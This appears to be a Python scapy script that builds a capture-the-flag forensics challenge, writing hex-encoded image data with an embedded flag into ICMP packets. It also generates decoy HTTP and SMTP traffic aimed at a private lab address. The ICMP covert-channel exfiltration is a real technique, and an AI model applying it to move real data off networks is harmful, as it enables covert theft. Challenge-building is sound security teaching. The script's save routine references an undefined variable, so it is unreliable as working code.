from scapy.all import *
import random
import time

pcap_filename = "chall.pcap"


def send_icmp_exfiltration(data, destination_ip):
    chunk_size = 32
    data_chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    for chunk in data_chunks:
        packet = IP(dst=destination_ip)/ICMP()/chunk
        send(packet)
        print(f"Sent ICMP packet with payload: {chunk}")
        time.sleep(1)  # Delay between sending packets

def generate_http_traffic(destination_ip):
    http_packet = IP(dst=destination_ip)/TCP(dport=80, sport=random.randint(1024, 65535))/Raw(load="GET / HTTP/1.1\r\nHost: whereistheflag.com\r\n\r\n")
    send(http_packet)
    print("Sent HTTP GET request.")

def generate_smtp_traffic(destination_ip):
    smtp_packet = IP(dst=destination_ip)/TCP(dport=25, sport=random.randint(1024, 65535))/Raw(load="EHLO bob1337.com\r\nMAIL FROM:<bobflagger@1337.com>\r\nRCPT TO:<alice@e1337.com>\r\nDATA\r\nSubject: Here is the flag, sort of\r\n\r\na2VlcCBmaW5kaW5nIGh1ZWh1ZSA9KQ==.\r\n.\r\nQUIT\r\n")
    send(smtp_packet)
    print("Sent SMTP email.")

def save_packets_to_pcap(filename):
    wrpcap(filename, packets)  # Write the captured packets to a PCAP file
    print(f"Packets saved to {filename}")

def main(destination_ip, data_to_exfiltrate, pcap_filename):
  try:
        while True:
            # Send ICMP for data exfiltration
            send_icmp_exfiltration(data_to_exfiltrate, destination_ip)

            # Randomly generate HTTP or SMTP traffic
            if random.choice([True, False]):
                generate_http_traffic(destination_ip)
            else:
                generate_smtp_traffic(destination_ip)

            time.sleep(5)  # Delay between iterations
  except KeyboardInterrupt:
    print("Exfiltration simulation stopped.")
    save_packets_to_pcap(pcap_filename)

if __name__ == "__main__":
    destination_ip = "192.168.1.10"
    data_to_exfiltrate = """89504e470d0a1a0a0000000d494844520000012c0000012c100400000083
e49abd000000206348524d00007a26000080840000fa00000080e8000075
300000ea6000003a98000017709cba513c00000002624b4744ffff14ab31
cd0000000774494d4507e80a1c1328296733e826000016144944415478da
eddd7b9c4df5fec7f10f2add14dd917453111d952e22e4528d4a454991d4
51cee854e8204d431c51a78b0875baaae85189921a4a08532e130751434e
6984c6755c668c31b33fbf3f3ebff5587bb3f7c848e3d3793d1f8f1e66ed
bdf65adffd5d6bbdd7f7b2f63965545505001c285bda050080df8ac002e0
068105c00d020b801b04160037082c006e105800dc20b000b84160017083
c002e0068105c00d020b801b04160037082c006e105800dc20b000b84160
017083c002e0068105c00d020b801b04160037082c006e105800dc20b000
b84160017083c002e0068105c00d020b801b04160037082c006e105800dc
20b000b84160017083c002e0068105c08ddf25b07efe59a4532791f3ce13
39e61891a38e12a95a55a4756b915dbb4afb2b166fd52a91499344b66d2b
bd326cda24b2746969d7c46f535020929121327bf6fe6f4bf5f759e77fd5
962d2253a78afcf8636997e48fb3df81356d9ac8534f890c1d2a929929f2
d65b2277de293276acc8e0c122871e7a600a1e89ecdfe7b76d13e9d851a4
797391a79f1639f2c80353cee2ecda25f2d04322279e28327efc81dfdffe
d6d9f4e9220d1b8adc7493485656c9b7ffe18722b56b8bf4ea15ff7d553b
26a79d26f2fefb07be5e3c7af65991060d44eeb947e490434abb347f20dd
0f2b56a89e7baeeace9db6bc70a1ea9147aaae5fbf3f5bddbbec6cd566cd
54bffaaa649fdfbe5df5f2cb55972e3db0e52cceba75aad75d67dfa1a8e8
c0ef6ffc78d5162d4afef90913545bb7568d44e2bfbf668d6aa346aaf3e7
27de4661a1ea830faa8e19a39a93a39a9fbfe73a9b37abde7aabeadcb907
fe3cf2eac10755870f2fed52948efdcae68e1d45aebf5ee4b0c36c79f870
914b2e1139e184031bb2bffe2a32678ec8faf525fb7c972e22a79e2a52ab
d6812d67229188c835d788dc728bc81557ecdfb60a0a44f2f2442a562c7e
bdb434eb426cdf2e72f4d1fbb68f952b45dab717993c59a44c99f8ebac5e
2d327fbe487676e2edf4ea655df0a14313af73d34d22575f2d72e9a5fb57
2f7f56a347db7f6bd79676494a4949936ed1225511d5a953c3d74e394575
e0c03f266957af2ed9e7366c503de410d537dffc63ca19cfd4a956773ffe
b87fdb993f5fb54a15d59f7edafbba9b36a9eed851b2fdf4efaf7afcf17b
6f0916774c7273558f3842f5fdf713af9391f1fbd4cb9f4d6e6ef877fdfa
aab7df5eda252a3d251ec34a4b13295f3e6c21ac58612d9fabaefa6382b6
4a95927d6ec60c91c2c23fae9cf17cf699c829a7889c71c6be7d6ef701e8
8913458e3842e4f4d3f7fed94a95440e3fbc64e5fde20b91264d44caeee5
6c29ee987cf9a5c8ce9d366698485a9ac8d967ef7bbd781489d879a82ab2
668d484e4efcf51a3716a95fdffedeba5564de3c91a64d4bbbf4a5a7c481
35638675ff828be0ebafede2a9572f76bdeddbad2b50bdba0d6cd7ac29f2
c61bb1ebac5b678387952b5b77a57c7991b7df8ebfdf152b44dab4b141c7
688b175b37ab624591c71f4f5cee2fbf14a95143a45a352b5b6aaa0deee6
e7c7aef7eebb166a679d25b271a3bdb671a3c8238f885c7badcd92d5ab27
d2aa95bdb77ebd488f1e1644fdfb175f77e9e922975d66dda8bbefb6cffc
fbdfe1fbe3c78b5c7041b8df2d5b44ba76b519a1406eae6de7d24b6dbd60
dddda98abcf9a6c839e758d7311089880c19627551bdbac8f2e5f13f9f9f
2f32776e7891cc9b675db69e3dc375962d13b9f146911123623f5b5020d2
af9fc8c9278bdc769b48ddba169cd1366c10e9dcd98edb934fc6bf18df7c
53e4ca2b45ce3dd78e9988cdacf6ec29d2ae9d2d6767db761a3796bd5ab0
c082b362459b188af6d34fb69d2a5544ce3fdf66c0452c507af7b62eab88
75933b7410e9d3c79667cf16494adaf3dc9b39d3eaa64a15eb328b58bd1f
7eb84d48952d2bd2b2a5fdab6ac779ecd8f0f34545e1714b4fb7e5a64d6d
ddd1a36d667eca94d87d2e5a2472fbed56ef9326d96b858522afbc6275f8
dd77226ddbda644f5e9ebd3764889d73bfa5fe4ad5be34c7b2b2541f78c0
0645cb9451bde822d5b66d559f7b4ef5de7b559b368d5dfffbef55ebd655
fdf65b5b7efd75d5b265ad5b169833c7069fbffe5a75d52ad50f3f547df8
e1f8fb7fe1055b574475faf4f0f5f9f36d4078f366eb722c5e9cf83b5c78
a16a972eaae3c65957e7a28b542fb8207c3f1251bde71ed5f7deb33289d8
f718374ef56f7fb3ee64d5aaaaf7dda7dab3a79569e142d56bae51ddba55
b5552bd51b6f4cbcffbc3cd5c30e534d4a521d3d5af5bfff553df6581bb0
5ebd5af5914754cf3843f5ecb3c3cfbcfebaea5147855dbaa95355efbacb
ca9694a4fa8f7fa88e1d9bf87855afaefa97bfc4bed7a58b7dc79c1c3b7e
8585f1cb3b6386ed273d5df5892754fbf6b5e5d75fb7f7870cb1ef2ea23a
7b76f8b99f7f566dd3c68efde6cdaa952b5b39a3cd9eaddaae9deaafbfaa
2e5962db78f7ddf0fdc242d53bee509d3851f5f3cfedfdac2cd58f3e52fd
fbdfed5ceadddb8ec11d77a856a8a0fad7bf167f0ecf9e6de7ec962daaef
bca3fadd77e17bcf3c63c7353b5bf5d5576d7f8f3d66fbbffb6e3be7bb74
511d34c8263044545352ac2c37dc60cbefbd176eefe9a755fbf5b37d89d8
31cacfb7eb2423433533d3ae9bb56b6dfd79f36c1fab5685dba85d5bf5b6
dbecef3e7dec582e5c68fbedd0c1b61bdd157ffb6dd5e464abbb638fb5e3
b378b16a8f1eaad5aaa9962ba7dabebd95ab73673b67939254172c501d39
d2eab0a0400f5a251ac39a3ddb2a6ad6acd88a7dfcf1d8f5ead553fdd7bf
c2e5e464d5cb2e0b97376c503deeb830d022113b201f7c107fbfb9b9aa9f
7ca27af8e1b1334c2d5b5a78eccd962d76c0dab4b1100aca187d21bdf28a
cd40aaaa0e1eac7ae79d61d98a8a548f3e5a75d8b070fdc2429b299d32c5
b65fbbb6055d22d3a75bdd2d5c18be56ad9a9d7c4168dc78a35d1881f6ed
adccd1e6cdb3edac5c99785f7979f66ff3e6aaddbb87af2f5fbee78591c8
c08156df2fbd64b3c1e9e9b6df5f7e098fc9071fd889be6b575857f5ead9
cca2aaeab66d16f41f7f1c7bec4f3e392cffac59b6dd356bc275860c09c3
3f25c5ce9fa0ce73726cfd860d2d542311bb40139d3b81a64d555353f77c
7df8709b390e8ec1ae5d36e3fdf8e3f6f7962d5667d75d673799050b6cff
fdfb5b3dbfffbeeaa1875ab954ed1ca856cd2efe8913ad9cb9b976e30b82
3d3535f6469392626354818202bbb94d9e6ccb0d1bdacdf5d34f6df9b1c7
ec7c0bac5861638d9b36d94dbc766d9b8d0e66766fbed9ae9568f7df1f36
10dab5b3d03e989528b09e7a2af604cdc9b1bbdd9429e13ae9e9160ec1dd
43d55a0d2929e1f2e0c1d6020b0417e1afbf26de77f7ee61a0043a75b293
a967cff853e5814993ac9c9b36d9f2d6ad56c6e872d7aaa5fae28b76a10e
18103b8dffcd3756be152bc2d73efe58f5c413ad85d0ae9d4d4614a77f7f
6b6d04b66fb7320c1d6acb454516e2e3c787eb54a9b2e724c133cfd805b1
373b76d885377162f8daead5f6dae9a7c7b654e3b9e61aabdfc0134fa89e
7f7eec3ac9c9762107a64cb156683048fff9e7767c366e0cd7193cd85a25
81418354cf3a2b76bba79d66df3b3535f6c6a76a1771f9f2e180f4a24556
8f9b3717ff7ddab5b3732025257c1c67eb56d5638eb1965ba0a02036643f
f9c40269eb565b1e3952f59c73c2f57bf6546dd2245c6edb56b55b37d537
deb050086e1eebd6d9bf0b16a8d6a8119e5f8585d6b27ef2c9701befbca3
7afdf5f6777ebe7ddfe816e89557c6f6467af4b0decf840976cca2eb3b12
513de924d51123c2d772726c2264ea54d5ae5dadc57fb02b5160b56a1556
a4aa0541993276170a0c18a05aa74eb8bc76ad5decc1dd4255f5e28b557b
f50a97535254cf3cb3f87d9f779e9decd1f2f3adc92e624ddd445252ac4b
18484bb39320e86a6ddc68dbb8ee3a3ba1763770a09d64d17af6b41361c0
80e2c332d0ac99755f021326580b26e826cf9d1b1baa999956a6dd67025b
b50abb0ac5993cd92ebce0420bcc9d6badd972e562bbe8d18a8aec428e0e
cbabaf567de8a1d8f54e3fdd5a4381ce9d556fb9255c4e4db51b41b4ba75
632fcea424d58e1dc3e59f7fb6ef7df3cd7633d85daf5eaa575d152e0f1b
662da4bdc9cbb316ab48781e8d1963cb419dab5ac856ad1a9e1bddbbc706
52ebd6618b4fd58616060d0a972b57b6de445a5afc72b469137bf37ee105
2bc37ffe13be76c515560faa610b34b899efd861e7eea449e1fa975c62d7
5cbce08977b30d66abefbdf7b7b5b60f06250aac134fb4718f406aaa9db4
aa7681050f192625d96bd9d91670227671cc9ca99af9ffadb261c3ec424f
4db5edb66f9f78bf2b57865dd14844757a5eec6315cd9ad9b841228d1ad9
5d28d0a78f9d14aa76b2a66db0ed2f5f1eae939919eee38a2b6c4c28dab5
d7da770d4422aa2fbf1c7f4ca8a0c05a362fbf1cbed6bc796c1765e0c0f0
ce9d9d6d5da20a15c2efbf6c59780c7af7b6bf172cb06e513cddbad98d21
d8dea8c1d64553b5aef81147ec196681a0db939565cb85855696e0d18495
2bc340cdc8b0805bbad45ad27dfbda3acb9659c8df7db72d4f9eacfa4343
bbc105ad9769d3acab3d6284d5dfe8d1d6a2d9bd8bb87871380c71f1c5aa
fffc67f85eebd6e1b040bcc72256ad8a6d4d36686021119c07871c12de70
22113b975e7c315cbf4e9d30e076eeb47a08ba9f9b36d9b9fcc5171688b3
aa59d9a35bc9ebd685f5969f6ffb1b33c696274db2b02d572e6c95f6ef1f
db5d1c342836f483b1c52d5becb86455b6732b7ab862db36d5b7deb2bf07
0cd8f366fbfcf3f69968d3a7c78eeb1d6cf6f9c1d11f7eb019b1962dc3d7
bef9c61e69484eb69995fbefb7d9a15f7eb19f9ea88a1c7fbcaddbb5abcd
509c956b3355a346892c59623389cf3d57fc8394d3a6d9bfafbc62b37853
32444e3bc666f3162fb6df2f2627c7ff6c4181cd7045ff1c2423c3becb93
4fdaf2e575ecdf61c3ece7459326d9cce57df7d92cdcdcb9222929b1db2d
5bd67eb2f2e59736e3356b96c8830f8a942bb76719162cb05999ac2c9bc9
1933c6660b070c882dd3a64d227dfbda36ca97b7c701ba76b5075d939345
76ecb072bff596cd6a356820f2c00389eb6cfd7a916edd4476b61479a98f
c8f1b56da66fc20491575f15a95021fe67d3d3ed31836ad56c3933d37ed2
346386cd8add7cb31d3b119191236d863739d9a6e9972cb173e0d8636d06
6ff97291471f1569d64c64d7cb225acb66d0a64db3d9aceddb6d392b4be4
aebb6c164e44e4f9e76d3f696922679e69bf59cdceb6ba8c7e0075c60cab
abc71eb319d1dd1f8d68d6cc66449b34b1d9ba1a356c3650c4662e0b0bad
2edab7b799c3468dec0163113bb7bffdd66687837de5e6868fc66464d8b9
fcecb3360377d37322e5da89bcf69ad5ddcc9976cc82732f33d3f6979e6e
bf032c5fde1e5d9833c71e21993347e4c20b456eb821f65844cfa06664d8
43bcafbe6ab3cddd2e1439f42b3ba7ead7b76b322bcbea5c44e4d34fc3f2
479fbb7979f6c0779d3a56c78d1bdb4cfe416b5f13eeb5d76207fa54ed6e
5abf7e6c323ffcb0dd953efbcc963b75b281e4e866778d1ad6acdeb9337c
68305e572c7adf356b8633312347da2063a34636c69168a64bd57e0253a7
4e6cb7f5a28b6c7078ce1c5b2e2a526ddcd8eef6494936a616f8e823ebb2
443fc4a76a4dfe4a95ac7bd5b76ff10f673ef594ea09275853be79f3f85d
9dce9dedbd6022a27d7b1b90df7d70bd450bebba062dae44ead5b32ee8ca
9556b6468dacce3a7488fd7ef174e810db6d9b39d3c6717af4085b692346
d8f9306e5cb8deadb75afd6566da3139f554bbc30775b36b97b516eebdd7
5adc8b16d950c0a851e198cece9dd6eaa850c1babfd19314a346d9785730
9bb57dbbb5d86eb821f124c490213636d8a489f50ea21f825dbddaca53b1
a21de3604226f0e187d6420cca3670a0b5ca02e9e9369e141c33559b6d3c
ea28bb2ea2271b54adeece3dd75ad241abeb830fec3c6ad6ccbaebd18a8a
6cdde856f4a38fdaa4c56baf85aff5eb67fbac5b37b61bbf71a39d2fbb8f
afae5963e5a854c926978a9bc039589451ddb7dfc3df79a7dd75fbf5db9f
90141934c8ee3e1d3bda6b4387dadd3127277eeb647fedd861cf8945fbee
3bbb9b24fab9c9ef6dd9327b0ec68bddebaca0c0eeda679f5dbae5cace16
39e9a4d8e3f6edb7d64af8332a2ab2ff829fc089d871a8542971ebf8cf6a
9f02aba8c81eb29c37cfba5f25515060dd974e9dc2277845ec61d0fc7c6b
ba02403cfb3486357ebc3d595cd2b02a2cb4279edbb68d0dab6ddbac9f3f
6e5c6957078083d95e036bed5a91efbfb79f287cf659e29fccfc161f7d64
ffd5aa653fb139ee381bc41f3edc06d21b352aedea0070302bb64b188988
b46861330e6ddb5ab0942f5ff29d7dffbd8d812d5962bfe3aa59d3fe07e1
7af5fadfeb8b03d877fb3ce80e00a585ff130a006e105800dc20b000b841
60017083c002e0068105c00d020b801b04160037082c006e105800dc20b0
00b84160017083c002e0068105c00d020b801b04160037082c006e105800
dc20b000b84160017083c002e0068105c00d020b801b04160037082c006e
105800dc20b000b84160017083c002e0068105c00d020b801b0416003708
2c006e105800dc20b000b84160017083c002e0068105c00d020b801b0416
0037082c006e105800dc20b000b84160017083c002e0068105c00d020b80
1b04160037082c006e105800dc20b000b84160017083c002e0068105c00d
020b801b04160037082c006e105800dc20b000b84160017083c002e00681
05c00d020b801b04160037082c006e105800dc20b000b84160017083c002
e0068105c00d020b801b04160037082c006e105800dc20b000b841600170
83c002e0068105c00d020b801b04160037082c006e105800dc20b000b841
60017083c002e0068105c00d020b801b04160037082c006e105800dc20b0
00b84160017083c002e0068105c00d020b801b04160037082c006e105800
dc20b000b84160017083c002e0068105c00d020b801b04160037082c006e
105800dc20b000b84160017083c002e0068105c00d020b801b0416003708
2c006e105800dc20b000b84160017083c002e0068105c00d020b801b0416
0037082c006e105800dc20b000b84160017083c002e0068105c00d020b80
1b04160037082c006e105800dc20b000b84160017083c002e0068105c00d
020b801b04160037082c006e105800dc20b000b84160017083c002e00681
05c00d020b801b04160037082c006e105800dc20b000b84160017083c002
e0068105c00d020b801b04160037082c006e105800dc20b000b841600170
83c002e0068105c00d020b801b04160037082c006e105800dc20b000b841
60017083c002e0068105c00d020b801b04160037082c006e105800dc20b0
00b84160017083c002e0068105c00d020b801b04160037082c006e105800
dc20b000b84160017083c002e0068105c00d020b801b04160037082c006e
105800dc20b000b84160017083c002e0068105c00d020b801b0416003708
2c006e105800dc20b000b84160017083c002e0068105c00d020b801b0416
0037082c006e105800dc20b000b84160017083c002e0068105c00d020b80
1b04160037082c006e105800dc20b000b84160017083c002e0068105c00d
020b801b04160037082c006e105800dc20b000b84160017083c002e00681
05c00d020b801b04160037082c006e105800dc20b000b84160017083c002
e0068105c00d020b801b04160037082c006e105800dc20b000b841600170
83c002e0068105c00d020b801b04160037082c006e105800dc20b000b841
600170e3ff00e52d3400c087b7e70000002574455874646174653a637265
61746500323032342d31302d32385431393a34303a34312b30303a30301a
0b5c6e0000002574455874646174653a6d6f6469667900323032342d3130
2d32385431393a34303a34312b30303a30306b56e4d20000002874455874
646174653a74696d657374616d7000323032342d31302d32385431393a34
303a34312b30303a30303c43c50d0000000049454e44ae4260824354467b
643176337267336e745f643474345f65786631696c7472347431306e7d0a
"""
    main(destination_ip, data_to_exfiltrate, pcap_filename)




